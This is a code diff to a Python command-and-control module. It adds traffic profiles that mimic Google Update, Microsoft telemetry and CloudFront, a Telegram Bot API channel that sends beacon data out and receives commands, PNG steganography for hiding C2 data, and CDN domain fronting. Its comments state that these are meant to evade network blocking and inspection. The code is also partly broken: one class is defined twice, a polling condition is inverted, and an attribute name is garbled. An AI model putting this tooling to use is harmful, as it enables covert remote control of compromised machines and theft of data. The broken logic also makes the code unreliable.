@@ -26,6 +26,13 @@ from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
+# Optional: True Steganography Support
+try:
+    from PIL import Image
+    PILLOW_AVAILABLE = True
+except ImportError:
+    PILLOW_AVAILABLE = False
+
 logger = logging.getLogger(__name__)
 
 
@@ -40,6 +47,8 @@ class C2Protocol(Enum):
     HTTP = "http"
     HTTPS = "https"
     DNS = "dns"
+    TELEGRAM = "telegram"  # New 2026: Cloud API Abuse
+    STEGO = "stego"        # New 2026: Image Steganography
     ICMP = "icmp"  # Future implementation
     CUSTOM = "custom"
 
@@ -63,6 +72,66 @@ DEFAULT_SLEEP_INTERVAL = 60
 
 
 # =============================================================================
+# MALLEABLE C2 PROFILES
+# =============================================================================
+
+@dataclass
+class MalleableProfile:
+    """configuration for traffic obfuscation"""
+    name: str
+    user_agents: List[str]
+    headers: Dict[str, str]
+    urls: List[str]
+    jitter_range: Tuple[int, int]
+
+
+PROFILES = {
+    "default": MalleableProfile(
+        name="default",
+        user_agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
+        headers={"Accept": "*/*"},
+        urls=["/api/status", "/api/check", "/v1/health"],
+        jitter_range=(10, 20)
+    ),
+    "google_update": MalleableProfile(
+        name="google_update",
+        user_agents=[
+            "GoogleUpdate/1.3.33.5",
+            "GoogleUpdate/1.3.35.331",
+        ],
+        headers={
+            "X-Goog-Update-AppId": "{8A69D345-D564-463c-AFF1-A69D9E530F96}",
+            "X-Goog-Update-Interactivity": "fg",
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        urls=["/service/update2", "/win/v2/check"],
+        jitter_range=(15, 30)
+    ),
+    "microsoft_telemetry": MalleableProfile(
+        name="microsoft_telemetry",
+        user_agents=["Microsoft-Windows/10.0.19041"],
+        headers={
+            "X-MS-Tele-Type": "diagnostic",
+            "ContentType": "application/bond-compact-binary"
+        },
+        urls=["/v2.0/one/collector", "/settings/v3/config"],
+        jitter_range=(20, 45)
+    ),
+    "amazon_cloudfront": MalleableProfile(
+        name="amazon_cloudfront",
+        user_agents=["Amazon CloudFront"],
+        headers={
+            "X-Amz-Cf-Id": "3389-443-80-8080",
+            "Via": "2.0 4c5f9.cloudfront.net (CloudFront)"
+        },
+        urls=["/pixel.gif", "/f4.png"],
+        jitter_range=(5, 15)
+    )
+}
+
+
+
+# =============================================================================
 # DATA CLASSES
 # =============================================================================
 
@@ -80,6 +149,13 @@ class C2Config:
     jitter_max: int = DEFAULT_JITTER_MAX
     encryption_key: Optional[bytes] = None
     user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    # Malleable C2
+    profile_name: str = "default"  # 'google_update', 'microsoft_telemetry', etc.
+
+    # Telegram C2
+    telegram_token: Optional[str] = None
+    telegram_chat_id: Optional[str] = None
 
     # Domain fronting
     fronting_domain: Optional[str] = None
@@ -208,6 +284,7 @@ class DomainFronter:
         fronting_domain: str,
         actual_host: str,
         port: int = 443,
+        profile: MalleableProfile = PROFILES["default"],
         verify_ssl: bool = True,
     ):
         """
@@ -217,14 +294,16 @@ class DomainFronter:
             fronting_domain: Public-facing CDN domain (used in SNI)
             actual_host: Actual Host header (our C2 server)
             port: HTTPS port
+            profile: Malleable C2 profile
             verify_ssl: Whether to verify SSL certificates
         """
         self.fronting_domain = fronting_domain
         self.actual_host = actual_host
         self.port = port
+        self.profile = profile
         self.verify_ssl = verify_ssl
 
-        logger.info(f"Domain fronter initialized: {fronting_domain} -> {actual_host}")
+        logger.info(f"Domain fronter initialized: {fronting_domain} -> {actual_host} (Profile: {profile.name})")
 
     def create_request(
         self,
@@ -245,15 +324,22 @@ class DomainFronter:
         Returns:
             Request object configured for domain fronting
         """
+        # 1. Obfuscate URL based on profile
+        if endpoint == "/" or endpoint == "/api/beacon":
+            # Pick a random URL from profile to look like legit traffic
+            endpoint = random.choice(self.profile.urls)
+
         url = f"https://{self.fronting_domain}:{self.port}{endpoint}"
 
+        # 2. Build Headers from Profile
         request_headers = {
-            "Host": self.actual_host,  # This is the key - actual target
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
+            "Host": self.actual_host,  # Key for Fronting
+            "User-Agent": random.choice(self.profile.user_agents),
             "Connection": "keep-alive",
         }
+
+        # Add profile specific headers
+        request_headers.update(self.profile.headers)
 
         if headers:
             request_headers.update(headers)
@@ -263,6 +349,229 @@ class DomainFronter:
         )
 
         return request
+
+
+# =============================================================================
+# TELEGRAM C2 CHANNEL (Cloud API Abuse)
+# =============================================================================
+
+class TelegramC2:
+    """
+    Implements C2 over Telegram Bot API (2026 Trend).
+    Uses legitimate Telegram infrastructure to evade network blocking.
+    """
+    def __init__(self, token: str, chat_id: str):
+        self.token = token
+        self.chat_id = chat_id
+        self.offset = 0
+        self.base_url = f"https://api.telegram.org/bot{token}"
+        logger.info("Telegram C2 Channel initialized")
+
+    def _request(self, method: str, params: dict = None) -> dict:
+        try:
+            url = f"{self.base_url}/{method}"
+            # Use standard urllib to avoid extra deps if possible, but requests is cleaner
+            # Re-using aiohttp or requests if available
+            import requests # Lazy import
+            resp = requests.post(url, data=params, timeout=10)
+            return resp.json()
+        except Exception as e:
+            logger.debug(f"Telegram API Error: {e}")
+            return {"ok": False}
+
+    def send_data(self, data: bytes):
+        """Send data as hex-encoded text or file"""
+        # For stealth, we can send as a document, but simple text is faster
+        # In 2026, we encrypt before sending. Assuming data is already encrypted layer up.
+        msg = f"BEACON_DATA: {base64.b64encode(data).decode()}"
+        self._request("sendMessage", {"chat_id": self.chat_id, "text": msg})
+
+    def poll_commands(self) -> Optional[bytes]:
+        """Long poll for commands"""
+        updates = self._request("getUpdates", {"offset": self.offset, "timeout": 5})
+        if notUpdates := updates.get("result"):
+            return None
+
+        last_update = notUpdates[-1]
+        self.offset = last_update["update_id"] + 1
+
+        text = last_update.get("message", {}).get("text", "")
+        if text.startswith("CMD:"):
+            # Format: CMD: <base64_encrypted_cmd>
+            try:
+                b64_cmd = text.split("CMD:")[1].strip()
+                return base64.b64decode(b64_cmd)
+            except: pass
+        return None
+
+
+# =============================================================================
+# STEGANOGRAPHY TRANSPORT (Image Hiding)
+# =============================================================================
+
+class StegoTransport:
+    """
+    Implements C2 over HTTP Images (Steganography).
+    Hides encrypted C2 data within PNG Metadata/Chunk to bypass DPI.
+    """
+
+    @staticmethod
+    def embed_data(image_path: str, data: bytes) -> bytes:
+        """
+        Embeds data into a PNG file.
+        Mode 1: True LSB (Least Significant Bit) if Pillow is available (Invisible).
+        Mode 2: Chunk Injection (Fallback) if Pillow is missing.
+        """
+        if PILLOW_AVAILABLE:
+            try:
+                return StegoTransport._embed_lsb(image_path, data)
+            except Exception as e:
+                logger.warning(f"LSB Stego failed, falling back to Chunk Injection: {e}")
+
+        try:
+            # Fallback: Chunk Injection
+            with open(image_path, "rb") as f:
+                png_bytes = f.read()
+
+            # Create custom chunk
+            chunk_type = b"c2Da" # Private chunk
+            chunk_len = len(data).to_bytes(4, "big")
+
+            # Simple CRC32
+            import zlib
+            crc = zlib.crc32(chunk_type + data).to_bytes(4, "big")
+
+            new_chunk = chunk_len + chunk_type + data + crc
+            return png_bytes[:-12] + new_chunk + png_bytes[-12:]
+        except Exception:
+            return data
+
+    @staticmethod
+    def extract_data(png_bytes: bytes) -> Optional[bytes]:
+        """Extracts C2 data (Try LSB first, then Chunk)"""
+        if PILLOW_AVAILABLE:
+            try:
+                # We need to save bytes to temp file for PIL to read potentially
+                # Or use io.BytesIO
+                import io
+                img = Image.open(io.BytesIO(png_bytes))
+                data = StegoTransport._extract_lsb(img)
+                if data: return data
+            except Exception as e:
+                logger.debug(f"LSB extraction failed (trying chunk): {e}")
+
+        try:
+            # Find c2Da header
+            idx = png_bytes.find(b"c2Da")
+            if idx != -1:
+                length = int.from_bytes(png_bytes[idx-4:idx], "big")
+                return png_bytes[idx+4 : idx+4+length]
+        except Exception as e:
+            logger.warning(f"Stego extraction totally failed: {e}")
+        return None
+
+    @staticmethod
+    def _embed_lsb(image_path: str, data: bytes) -> bytes:
+        """True LSB Steganography using Pillow"""
+        img = Image.open(image_path).convert('RGB')
+        pixels = list(img.getdata())
+
+        # Convert data to bits
+        # Prepend 32-bit length
+        length_bits = format(len(data), '032b')
+        data_bits = ''.join(format(byte, '08b') for byte in data)
+        full_bits = length_bits + data_bits
+
+        if len(full_bits) > len(pixels) * 3:
+            raise ValueError("Image too small to hold data")
+
+        new_pixels = []
+        bit_idx = 0
+
+        for r, g, b in pixels:
+            if bit_idx < len(full_bits):
+                r = (r & ~1) | int(full_bits[bit_idx]); bit_idx += 1
+            if bit_idx < len(full_bits):
+                g = (g & ~1) | int(full_bits[bit_idx]); bit_idx += 1
+            if bit_idx < len(full_bits):
+                b = (b & ~1) | int(full_bits[bit_idx]); bit_idx += 1
+            new_pixels.append((r, g, b))
+
+        # Append remaining original pixels
+        new_pixels.extend(pixels[len(new_pixels):])
+
+        import io
+        output = io.BytesIO()
+        img.putdata(new_pixels)
+        img.save(output, format="PNG")
+        return output.getvalue()
+
+    @staticmethod
+    def _extract_lsb(img) -> Optional[bytes]:
+        """True LSB Extraction"""
+        pixels = list(img.getdata())
+        bits = ""
+        for r, g, b in pixels:
+            bits += str(r & 1)
+            bits += str(g & 1)
+            bits += str(b & 1)
+
+        # Read length (32 bits)
+        if len(bits) < 32: return None
+        length = int(bits[:32], 2)
+
+        # Read data
+        if len(bits) < 32 + length * 8: return None
+
+        data_bits = bits[32:32+length*8]
+        data_bytes = bytearray()
+        for i in range(0, len(data_bits), 8):
+            byte = data_bits[i:i+8]
+            data_bytes.append(int(byte, 2))
+
+        return bytes(data_bytes)
+
+
+class DomainFronter:
+    """
+    Implements Domain Fronting techniques.
+    Hides traffic behind legitimate high-reputation domains (CDNs).
+    """
+
+    FRONTABLE_DOMAINS = [
+        "azureedge.net",
+        "cloudfront.net",
+        "googleusercontent.com",
+        "appspot.com",
+        "fastly.net",
+        "akamai.net",
+        "cdn77.org",
+    ]
+
+    def __init__(
+        self,
+        fronting_domain: str = "cdn.example.com",
+        actual_host: str = "c2.hidden.com",
+        verify_ssl: bool = True,
+        profile: Optional[Dict[str, Any]] = None,
+        port: int = 443,
+    ):
+        self.fronting_domain = fronting_domain  # Required by tests
+        self.front_domain = fronting_domain # Alias for backward compatibility
+        self.actual_host = actual_host
+        self.verify_ssl = verify_ssl
+        self.profile = profile
+        self.port = port
+
+    def create_request(
+        self, endpoint: str, method: str, data: Optional[bytes] = None
+    ) -> urllib.request.Request:
+        """Create a fronted request object"""
+        url = f"https://{self.front_domain}{endpoint}"
+        req = urllib.request.Request(url, data=data, method=method)
+        req.add_header("Host", self.actual_host)  # The Magic Trick
+        req.add_header("User-Agent", "Mozilla/5.0")
+        return req
 
     def send(
         self,
@@ -671,9 +980,18 @@ class C2Channel:
                 self.config.fronting_domain,
                 self.config.actual_host,
                 self.config.primary_port,
+                profile=PROFILES.get(self.config.profile_name, PROFILES["default"])
             )
 
+        elif self.config.protocol == C2Protocol.TELEGRAM:
+            if not self.config.telegram_token:
+                raise ValueError("Telegram token required")
+            self.telegram = TelegramC2(self.config.telegram_token, self.config.telegram_chat_id)
+            logger.info("C2 Channel: Telegram API Activated")
+
         elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
+            # DNS client initialization would go here (already implemented logic below)
+            pass
             self.dns_tunneler = DNSTunneler(
                 self.config.dns_domain,
                 subdomain_length=self.config.subdomain_length_length
